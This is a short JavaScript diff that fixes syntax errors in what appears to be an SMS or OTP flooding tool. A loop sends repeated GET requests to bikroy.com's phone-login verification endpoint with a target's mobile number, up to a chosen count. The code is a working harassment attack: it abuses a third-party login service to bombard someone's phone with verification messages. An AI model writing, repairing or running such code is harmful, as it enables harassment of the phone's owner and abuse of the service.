@@ -56,10 +56,9 @@ $(document).ready(() => {
                     while (c < amount) {
                         APIS.forEach(API => {
                             config = {
-                                method: "GET"
-                                    url: 'https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${mobile}`
-                            },
-                                     {
+                                method: 'GET',
+                                    url: `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${mobile}`
+                            }
                             $.ajax(config);
                             c += 1;
                         });
